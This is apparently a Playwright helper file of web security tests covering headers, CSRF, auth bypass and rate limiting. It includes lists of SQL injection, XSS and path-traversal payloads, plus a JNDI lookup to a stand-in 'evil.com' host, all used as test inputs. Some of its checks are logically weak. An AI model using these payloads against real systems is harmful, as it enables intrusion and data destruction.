/**
 * Security Test Helper Utilities
 *
 * Provides reusable test helpers for security testing including
 * OWASP Top 10 validation, injection attack prevention, and security headers.
 */

import type { Page } from '@playwright/test'
import { expect } from '@playwright/test'

/**
 * Security headers that should be present
 */
export const SECURITY_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY' || 'SAMEORIGIN',
  'X-XSS-Protection': '1; mode=block',
  'Strict-Transport-Security': 'max-age',
  'Content-Security-Policy': 'default-src',
  'Referrer-Policy': 'strict-origin-when-cross-origin' || 'no-referrer',
} as const

/**
 * Check that security headers are present in response
 */
export async function assertSecurityHeaders(page: Page): Promise<void> {
  const response = await page.goto(page.url())
  if (!response) {
    throw new Error('No response available')
  }

  const headers = response.headers()

  // Check X-Content-Type-Options
  expect(headers['x-content-type-options'], 'Should have X-Content-Type-Options header').toBeTruthy()

  // Check X-Frame-Options or Content-Security-Policy frame-ancestors
  const hasFrameProtection =
    headers['x-frame-options'] ||
    (headers['content-security-policy'] && headers['content-security-policy'].includes('frame-ancestors'))
  expect(hasFrameProtection, 'Should have frame protection (X-Frame-Options or CSP)').toBeTruthy()

  // Check X-XSS-Protection (legacy, but still useful)
  if (headers['x-xss-protection']) {
    expect(headers['x-xss-protection']).toContain('1')
  }
}

/**
 * Test SQL injection prevention
 * Attempts common SQL injection patterns and verifies they don't execute
 */
export async function testSQLInjectionPrevention(
  page: Page,
  inputSelector: string,
  submitSelector: string
): Promise<void> {
  const sqlInjectionAttempts = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
  ]

  for (const attempt of sqlInjectionAttempts) {
    await page.fill(inputSelector, attempt)
    await page.click(submitSelector)
    await page.waitForTimeout(1000)

    // Verify no SQL error messages are exposed
    const bodyText = await page.textContent('body') || ''
    const sqlErrorIndicators = [
      'sql syntax',
      'mysql error',
      'postgres error',
      'database error',
      'sqlstate',
    ]

    for (const indicator of sqlErrorIndicators) {
      expect(
        bodyText.toLowerCase().includes(indicator.toLowerCase()),
        `SQL error should not be exposed: ${indicator}`
      ).toBeFalsy()
    }
  }
}

/**
 * Test XSS (Cross-Site Scripting) prevention
 * Attempts common XSS patterns and verifies they don't execute
 */
export async function testXSSPrevention(
  page: Page,
  inputSelector: string,
  submitSelector: string
): Promise<void> {
  const xssAttempts = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    "javascript:alert('XSS')",
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
  ]

  for (const attempt of xssAttempts) {
    await page.fill(inputSelector, attempt)
    await page.click(submitSelector)
    await page.waitForTimeout(1000)

    // Check if script executed (should not)
    const scriptExecuted = await page.evaluate(() => {
      // Check if alert was called (would indicate XSS)
      return typeof (window as unknown as { alertCalled?: boolean }).alertCalled !== 'undefined'
    })

    expect(scriptExecuted, `XSS should not execute: ${attempt}`).toBeFalsy()

    // Verify script tags are sanitized in DOM
    const scriptTags = await page.locator('script').count()
    // Should only have legitimate script tags (not injected ones)
    expect(scriptTags, 'Should not have injected script tags').toBeLessThan(10)
  }
}

/**
 * Test CSRF (Cross-Site Request Forgery) protection
 * Verifies that forms include CSRF tokens
 */
export async function testCSRFProtection(
  page: Page,
  formSelector: string
): Promise<void> {
  const form = page.locator(formSelector)
  const formHTML = await form.innerHTML()

  // Check for CSRF token in form (common patterns)
  const csrfTokenPatterns = [
    /name=["']csrf[_-]?token["']/i,
    /name=["']_token["']/i,
    /name=["']authenticity[_-]?token["']/i,
    /X-CSRF-Token/i,
  ]

  const hasCSRFToken = csrfTokenPatterns.some((pattern) => pattern.test(formHTML))

  // Note: This is a basic check - actual CSRF protection depends on framework
  // In a tRPC/API context, CSRF might be handled differently
  // This test verifies that forms have some token mechanism
  if (!hasCSRFToken) {
    // Check headers for CSRF token in API requests
    const response = await page.goto(page.url())
    const headers = response?.headers() || {}
    const hasHeaderToken = headers['x-csrf-token'] || headers['csrf-token']

    expect(
      hasCSRFToken || hasHeaderToken,
      'Form should have CSRF protection (token or header)'
    ).toBeTruthy()
  }
}

/**
 * Test authentication bypass attempts
 * Verifies that unauthorized access is prevented
 */
export async function testAuthenticationBypass(
  page: Page,
  protectedUrl: string
): Promise<void> {
  // Try to access protected route without authentication
  const response = await page.goto(protectedUrl, { waitUntil: 'networkidle' })

  // Should redirect to login or return 401/403
  const status = response?.status() || 0
  const url = page.url()

  const isRedirected = url.includes('/auth') || url.includes('/login')
  const isUnauthorized = status === 401 || status === 403

  expect(
    isRedirected || isUnauthorized,
    'Protected route should require authentication'
  ).toBeTruthy()
}

/**
 * Test authorization bypass attempts
 * Verifies that users can't access resources they don't have permission for
 */
export async function testAuthorizationBypass(
  page: Page,
  unauthorizedUrl: string
): Promise<void> {
  const response = await page.goto(unauthorizedUrl, { waitUntil: 'networkidle' })

  const status = response?.status() || 0
  const bodyText = await page.textContent('body') || ''

  // Should return 403 or show unauthorized message
  const isForbidden = status === 403
  const showsUnauthorized =
    bodyText.toLowerCase().includes('unauthorized') ||
    bodyText.toLowerCase().includes('forbidden') ||
    bodyText.toLowerCase().includes('permission denied')

  expect(
    isForbidden || showsUnauthorized,
    'Unauthorized access should be prevented'
  ).toBeTruthy()
}

/**
 * Test sensitive data exposure
 * Verifies that sensitive data is not exposed in responses
 */
export async function testSensitiveDataExposure(page: Page): Promise<void> {
  // Get page content and check for sensitive data patterns
  const bodyText = await page.textContent('body') || ''
  const pageHTML = await page.content()

  // Check for common sensitive data patterns
  const sensitivePatterns = [
    /password["']?\s*[:=]\s*["']?[^"'\s]+/i,
    /api[_-]?key["']?\s*[:=]\s*["']?[^"'\s]+/i,
    /secret["']?\s*[:=]\s*["']?[^"'\s]+/i,
    /token["']?\s*[:=]\s*["']?[^"'\s]{20,}/i,
    /ssn["']?\s*[:=]\s*["']?\d{3}-\d{2}-\d{4}/i,
    /credit[_-]?card["']?\s*[:=]\s*["']?\d{4}/i,
  ]

  for (const pattern of sensitivePatterns) {
    const matches = bodyText.match(pattern) || pageHTML.match(pattern)
    if (matches) {
      // Allow patterns in commented code or test data, but not in actual values
      const isInComment = pageHTML.includes(`<!-- ${matches[0]}`) || pageHTML.includes(`/* ${matches[0]}`)
      expect(isInComment, `Sensitive data should not be exposed: ${matches[0]}`).toBeTruthy()
    }
  }
}

/**
 * Test input validation
 * Verifies that inputs are properly validated and sanitized
 */
export async function testInputValidation(
  page: Page,
  inputSelector: string,
  submitSelector: string
): Promise<void> {
  const invalidInputs = [
    { value: '<script>', type: 'XSS attempt' },
    { value: "'; DROP TABLE; --", type: 'SQL injection attempt' },
    { value: '../../../etc/passwd', type: 'Path traversal attempt' },
    { value: '${jndi:ldap://evil.com}', type: 'LDAP injection attempt' },
    { value: '../../', type: 'Directory traversal attempt' },
  ]

  for (const invalid of invalidInputs) {
    await page.fill(inputSelector, invalid.value)
    await page.click(submitSelector)
    await page.waitForTimeout(1000)

    // Input should be rejected or sanitized
    // Check if error message is shown or input is cleared
    const inputValue = await page.inputValue(inputSelector)
    const bodyText = await page.textContent('body') || ''

    const isRejected = inputValue === '' || bodyText.toLowerCase().includes('invalid')
    const isSanitized = inputValue !== invalid.value

    expect(
      isRejected || isSanitized,
      `Input validation should handle ${invalid.type}`
    ).toBeTruthy()
  }
}

/**
 * Test HTTPS enforcement
 * Verifies that HTTPS is enforced in production
 */
export async function testHTTPSEnforcement(page: Page): Promise<void> {
  const url = page.url()
  const isHTTPS = url.startsWith('https://')

  if (process.env.NODE_ENV === 'production' || process.env.CI) {
    expect(isHTTPS, 'Production should use HTTPS').toBeTruthy()
  }
}

/**
 * Test rate limiting
 * Verifies that rate limiting is in place to prevent abuse
 */
export async function testRateLimiting(
  page: Page,
  action: () => Promise<void>,
  maxRequests = 10
): Promise<void> {
  const responses: number[] = []

  for (let i = 0; i < maxRequests + 5; i++) {
    await action()
    await page.waitForTimeout(100)

    const response = await page.evaluate(() => {
      // Get last response status from performance entries
      return (performance.getEntriesByType('navigation')[0] as PerformanceNavigationTiming)?.responseStatus || 200
    }).catch(() => 200)

    responses.push(response)
  }

  // After max requests, should get rate limit response (429)
  const hasRateLimit = responses.some((status) => status === 429)

  // Note: Rate limiting might not be enabled in development
  // This test verifies behavior if rate limiting is configured
  if (process.env.NODE_ENV === 'production') {
    expect(hasRateLimit, 'Rate limiting should be enabled in production').toBeTruthy()
  }
}

